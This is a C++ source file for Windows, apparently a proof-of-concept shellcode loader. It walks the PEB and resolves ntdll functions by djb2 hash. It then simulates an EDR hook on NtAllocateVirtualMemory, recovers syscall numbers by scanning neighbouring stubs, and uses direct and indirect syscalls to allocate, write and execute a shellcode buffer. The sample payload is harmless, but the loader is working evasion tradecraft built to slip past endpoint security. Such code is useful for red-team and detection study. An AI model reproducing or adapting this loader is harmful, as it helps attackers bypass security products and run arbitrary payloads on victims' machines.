#include <windows.h>
#include <iostream>

typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    _Field_size_bytes_part_opt_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef LONG NTSTATUS;

// PEB

typedef struct {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct {
    BYTE InheritedAddressSpace;
    BYTE ReadImageFileExecOptions;
    BYTE BeingDebugged;
    BYTE BitField;
    PVOID Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

// NT Function Templates

typedef NTSTATUS(NTAPI* fnNtAllocateVirtualMemory)(HANDLE ProcessHandle, 
    PVOID* BaseAddress, ULONG ZeroBits, PULONG RegionSize, 
    ULONG AllocationType, ULONG Protect);

typedef NTSTATUS(NTAPI* fnNtProtectVirtualMemory)(HANDLE ProcessHandle, 
    PVOID* BaseAddress, PSIZE_T NumberOfBytesToProtect, 
    ULONG NewAccessProtection, PULONG OldAccessProtection);

typedef NTSTATUS(NTAPI* fnNtWriteVirtualMemory)(HANDLE ProcessHandle, 
    PVOID BaseAddress, PVOID Buffer, SIZE_T NUmberOfBytesToWrite, 
    PSIZE_T NumberOfBytesWritten);

// Helper functions

DWORD HashStringDjb2(const char* str)
{
    ULONG hash = 5381;
    while(*str)
    {
        hash = ((hash << 5) + hash) + *str;
        str++;
    }
    return hash;
}

// Custom functions

HMODULE CustomGetModuleHandleA(const char* targetModuleName)
{
    ULONG64 pebAddress = __readgsqword(0x60);
    PPEB peb = (PPEB)pebAddress;
    PLIST_ENTRY listHead = &peb->Ldr->InLoadOrderModuleList;
    PLIST_ENTRY currEntry = listHead->Flink;
    while(currEntry != listHead)
    {
        PLDR_DATA_TABLE_ENTRY currLdrEntry = (PLDR_DATA_TABLE_ENTRY)currEntry;
        char* currModuleName = (char*)calloc(currLdrEntry->BaseDllName.Length, sizeof(char));
        wcstombs(currModuleName, currLdrEntry->BaseDllName.Buffer, currLdrEntry->BaseDllName.Length);
        if(!targetModuleName || !strcmpi(targetModuleName, currModuleName))
        {
            free(currModuleName);
            return (HMODULE)currLdrEntry->DllBase;
        }
        free(currModuleName);
        currEntry = currEntry->Flink;
    }
    return NULL;
}

FARPROC CustomGetProcAddressByDjb2Hash(HMODULE baseModule, DWORD targetFuncHash)
{
    BYTE* baseModuleAddress = (BYTE*)baseModule;
    PIMAGE_DOS_HEADER moduleImageDosHeader = (PIMAGE_DOS_HEADER)baseModuleAddress;
    PIMAGE_NT_HEADERS64 moduleNtHeaders = (PIMAGE_NT_HEADERS64)(baseModuleAddress + moduleImageDosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY moduleExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(baseModuleAddress + moduleNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* nameRVAs = (DWORD*)(baseModuleAddress + moduleExportDirectory->AddressOfNames);
    WORD* ordinals = (WORD*)(baseModuleAddress + moduleExportDirectory->AddressOfNameOrdinals);
    DWORD* funcRVAs = (DWORD*)(baseModuleAddress + moduleExportDirectory->AddressOfFunctions);
    for(DWORD i = 0; i < moduleExportDirectory->NumberOfNames; i++)
    {
        const char* currFuncName = (const char*)(baseModuleAddress + nameRVAs[i]);
        if(targetFuncHash == HashStringDjb2(currFuncName))
        {
            return (FARPROC)(baseModuleAddress + funcRVAs[ordinals[i]]);
        }
    }
    return NULL;
}

BOOL ResolveSyscallEntry(BYTE* funcAddr, DWORD* outSsn, PVOID* outSyscallInstAddr)
{
    if(funcAddr[0] == 0x4c && funcAddr[1] == 0x8b && funcAddr[2] == 0xd1 && funcAddr[3] == 0xb8)
    {
        *outSsn = *(WORD*)(funcAddr + 4);
    }
    if(funcAddr[0] == 0xe9 || funcAddr[3] == 0xe9)
    {
        printf("[!] WARNING: A hook was detected at: 0x%p\n", funcAddr);
        for(WORD idx = 0; idx < 500; idx++)
        {
            BYTE* downNeighbor = funcAddr + (idx * 0x20);
            if(downNeighbor[0] == 0x4c && downNeighbor[1] == 0x8b && downNeighbor[2] == 0xd1 && downNeighbor[3] == 0xb8)
            {
                WORD neighborSsn = *(WORD*)(downNeighbor + 4);
                *outSsn = neighborSsn - idx;
                break;
            }
            BYTE* upNeighbor = funcAddr - (idx * 0x20);
            if(upNeighbor[0] == 0x4c && upNeighbor[1] == 0x8b && upNeighbor[2] == 0xd1 && upNeighbor[3] == 0xb8)
            {
                WORD neighborSssn = *(WORD*)(upNeighbor + 4);
                *outSsn = neighborSssn + idx;
                break;
            }
        }
    }
    for(WORD i = 0; i < 32; i++)
    {
        if(funcAddr[i] == 0x0f && funcAddr[i+1] == 0x05 && funcAddr[i+2] == 0xc3)
        {
            *outSyscallInstAddr = &funcAddr[i];
            break;
        }
    }
    return TRUE;
}

// Extern functions

extern "C" VOID PrepareSyscall(DWORD ssn, PVOID syscallInstructionAddr);
extern "C" NTSTATUS DoDirectSyscall(...);
extern "C" NTSTATUS DoIndirectSyscall(...);

int main()
{
    HMODULE hNtdll = CustomGetModuleHandleA("ntdll.dll");
    fnNtAllocateVirtualMemory NtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)CustomGetProcAddressByDjb2Hash(hNtdll, 0x6793c34c);
    fnNtProtectVirtualMemory NtProtectVirtualMemory = (fnNtProtectVirtualMemory)CustomGetProcAddressByDjb2Hash(hNtdll, 0x082962c8);
    fnNtWriteVirtualMemory NtWriteVirtualMemory = (fnNtWriteVirtualMemory)CustomGetProcAddressByDjb2Hash(hNtdll, 0x95f3a792);
    printf("[!] NT functions resolved successfully.\n");
    printf("[+] NtAllocateVirtualMemory first 8 bytes before the EDR hook: ");
    BYTE* baseNtAllocateVirtualMemory = (BYTE*)NtAllocateVirtualMemory;
    BYTE* baseNtWriteVirtualMemory = (BYTE*)NtWriteVirtualMemory;
    BYTE* baseNtProtectVirtualMemory = (BYTE*)NtProtectVirtualMemory;
    for(int i = 0; i < 8; i++)
    {
        printf("%X ", baseNtAllocateVirtualMemory[i]);
    }
    printf("\n[!] Patching first 5 bytes of NtAllocateVirtualMemory.\n");
    SIZE_T numberOfBytesToProtect = 32;
    ULONG oldAccessProtection = NULL;
    BYTE* protectBuffer = baseNtAllocateVirtualMemory;
    NTSTATUS ntStatus = NtProtectVirtualMemory((HANDLE)-1, (PVOID*)&protectBuffer, &numberOfBytesToProtect, PAGE_EXECUTE_READWRITE, &oldAccessProtection);
    if(ntStatus != 0x00000000)
    {
        printf("[-] Unexpected: NtProtectVirtualMemory returned: 0x%08X\n", ntStatus);
        return 1;
    }
    baseNtAllocateVirtualMemory[0] = 0xE9;
    baseNtAllocateVirtualMemory[1] = 0xAA;
    baseNtAllocateVirtualMemory[2] = 0xBB;
    baseNtAllocateVirtualMemory[3] = 0xCC;
    baseNtAllocateVirtualMemory[4] = 0xDD;
    ntStatus = NtProtectVirtualMemory((HANDLE)-1, (PVOID*)&protectBuffer, &numberOfBytesToProtect, PAGE_EXECUTE_READ, &oldAccessProtection);
    if(ntStatus != 0x00000000)
    {
        printf("[-] Unexpected: NtProtectVirtualMemory returned: 0x%08X\n", ntStatus);
        return 1;
    }
    printf("[+] Patched successfully. The first 8 bytes of NtAllocateVirtualMemory after patch: ");
    for(int i = 0; i < 8; i++)
    {
        printf("%X ", baseNtAllocateVirtualMemory[i]);
    }
    printf("\n[!] Resolving SSNs for NT functions.\n");
    DWORD ssnNtAllocateVirtualMemory = 0;
    DWORD ssnNtProtectVirtualMemory = 0;
    DWORD ssnNtWriteVirtualMemory = 0;
    PVOID legitimateInstrAddrNtAllocateVirtualMemory;
    PVOID legitimateInstrAddrNtProtectVirtualMemory;
    PVOID legitimateInstrAddrNtWriteVirtualMemory;
    ResolveSyscallEntry(baseNtAllocateVirtualMemory, &ssnNtAllocateVirtualMemory, &legitimateInstrAddrNtAllocateVirtualMemory);
    ResolveSyscallEntry(baseNtWriteVirtualMemory, &ssnNtWriteVirtualMemory, &legitimateInstrAddrNtWriteVirtualMemory);
    ResolveSyscallEntry(baseNtProtectVirtualMemory, &ssnNtProtectVirtualMemory, &legitimateInstrAddrNtProtectVirtualMemory);
    printf("[+] Recovered SSN for the NtAllocateVirtualMemory: 0x%X and syscall gadget address: 0x%p, NtProtectVirtualMemory: 0x%X and syscall gadget address: 0x%p, NtWriteVirtualMemory: 0x%X and syscall gadget address(not used for direct syscall): 0x%p\n", ssnNtAllocateVirtualMemory, legitimateInstrAddrNtAllocateVirtualMemory, ssnNtProtectVirtualMemory, legitimateInstrAddrNtProtectVirtualMemory, ssnNtWriteVirtualMemory, legitimateInstrAddrNtWriteVirtualMemory);
    PVOID baseAllocatedAddress = NULL;
    SIZE_T regionSize = 4096;
    printf("[!] Making the indirect syscall for NtAllocateVirtualMemory.\n");
    PrepareSyscall(ssnNtAllocateVirtualMemory, legitimateInstrAddrNtAllocateVirtualMemory);
    ntStatus = DoIndirectSyscall((HANDLE)-1, &baseAllocatedAddress, 0, &regionSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if(ntStatus != 0x00000000)
    {
        printf("[-] Unexpected: Indirect syscall for NtAllocateVirtualMemory returned: 0x%08X\n", ntStatus);
        return 1;
    }
    printf("[+] Indirect syscall successful, copying payload with direct syscall and protecting the allocated memory.\n");
    const char payload[] = "\xB8\x39\x05\x00\x00\xC3";
    PrepareSyscall(ssnNtWriteVirtualMemory, legitimateInstrAddrNtWriteVirtualMemory);
    SIZE_T numberOfBytesWritten = 0;
    ntStatus = DoDirectSyscall((HANDLE)-1, baseAllocatedAddress, (PVOID)payload, sizeof(payload), &numberOfBytesWritten);
    if(ntStatus != 0x00000000)
    {
        printf("[-] Unexpected: Direct syscall for NtWriteVirtualMemory returned: 0x%08X\n", ntStatus);
        return 1;
    }
    //memcpy(baseAllocatedAddress, payload, sizeof(payload));
    PrepareSyscall(ssnNtProtectVirtualMemory, legitimateInstrAddrNtProtectVirtualMemory);
    ntStatus = DoIndirectSyscall((HANDLE)-1, &baseAllocatedAddress, &regionSize, PAGE_EXECUTE_READ, &oldAccessProtection);
    if(ntStatus != 0x00000000)
    {
        printf("[-] Unexpected: Indirect syscall for NtProtectVirtualMemory returned: 0x%08X\n", ntStatus);
        return 1;
    }
    printf("[+] Copied the payload and protected allocated memory successfully. Triggering execution.\n");
    typedef int (*fnShellcode)();
    fnShellcode Shellcode = (fnShellcode)baseAllocatedAddress;
    int ret = Shellcode();
    printf("[+] Shellcode function returned: %d\n", ret);
    printf("[!] Restoring NtAllocateVirtualMemory hook.\n");
    ntStatus = NtProtectVirtualMemory((HANDLE)-1, (PVOID*)&protectBuffer, &numberOfBytesToProtect, PAGE_EXECUTE_READWRITE, &oldAccessProtection);
    if(ntStatus != 0x00000000)
    {
        printf("[-] Unexpected: NtProtectVirtualMemory returned: 0x%08X\n", ntStatus);
        return 1;
    }
    baseNtAllocateVirtualMemory[0] = 0x4c;
    baseNtAllocateVirtualMemory[1] = 0x8b;
    baseNtAllocateVirtualMemory[2] = 0xd1;
    baseNtAllocateVirtualMemory[3] = 0xb8;
    baseNtAllocateVirtualMemory[4] = 0x18;
    ntStatus = NtProtectVirtualMemory((HANDLE)-1, (PVOID*)&protectBuffer, &numberOfBytesToProtect, PAGE_EXECUTE_READ, &oldAccessProtection);
    if(ntStatus != 0x00000000)
    {
        printf("[-] Unexpected: NtProtectVirtualMemory returned: 0x%08X\n", ntStatus);
        return 1;
    }
    printf("[+] Restored NtAllocateVirtualMemory hook.\n");
    getchar();
    return 0;
}